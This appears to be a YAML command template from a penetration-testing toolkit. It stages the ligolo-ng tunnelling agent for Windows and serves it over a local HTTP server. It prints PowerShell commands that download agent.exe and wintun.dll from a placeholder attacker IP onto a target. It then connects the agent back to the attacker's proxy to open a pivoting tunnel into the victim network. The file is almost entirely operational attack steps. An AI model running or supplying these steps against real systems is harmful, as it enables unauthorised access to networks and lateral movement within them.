metadata:
  filename: deliver-windows-ligolo-ng-including-setup.yaml
  tags:
  - windows
  - proxy
  created: '2025-03-29'
  author: Unknown
content: "mkdir -p packstation/outbound;\\\ncp {{ tools_dir }}/ligolo-ng/agent/windows/agent.exe\
  \ packstation/outbound/;\\\ncp {{ tools_dir }}/ligolo-ng/agent/wintun/wintun/bin/amd64/wintun.dll\
  \ packstation/outbound/;\\\ncp {{ tools_dir }}/ligolo-ng/proxy/linux/proxy .;\\\n\
  echo '================================================================'; \\\necho\
  \ '                      -----Kali-----                            '; \\\necho \"\
  Start proxy: sudo '$(pwd)/proxy' -selfcert\"; \\\necho \"Create a new tuntap interface:\
  \ interface_create --name 'ligolo' \"; \\\necho \"Show agent interfaces: ifconfig\"\
  ; \\\necho \"Setup the routes: route_add --name ligolo --route <cidr>\"; \\\necho\
  \ \"Start the tunnel: tunnel_start --tun ligolo\"; \\\necho '================================================================';\
  \ \\\necho '                      -----PowerShell-----                      '; \\\
  \necho 'Preperation 2 (Deliver agent.exe): iwr -uri http://{{ attacker_ip }}:{{\
  \ delivery_outbound_port }}/agent.exe -Outfile {{ delivery_path_windows }}\\agent.exe';\
  \ \\\necho 'Preperation 3 (Deliver wintun.dll): iwr -uri http://{{ attacker_ip }}:{{\
  \ delivery_outbound_port }}/wintun.dll -Outfile {{ delivery_path_windows }}\\wintun.dll';\
  \ \\\necho \"Connect agent to proxy: {{ delivery_path_windows }}\\agent.exe -ignore-cert\
  \ -connect {{ attacker_ip }}:11601\"; \\\necho '================================================================';\
  \ \\\n python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{\
  \ delivery_outbound_port }} -d packstation/outbound\n"
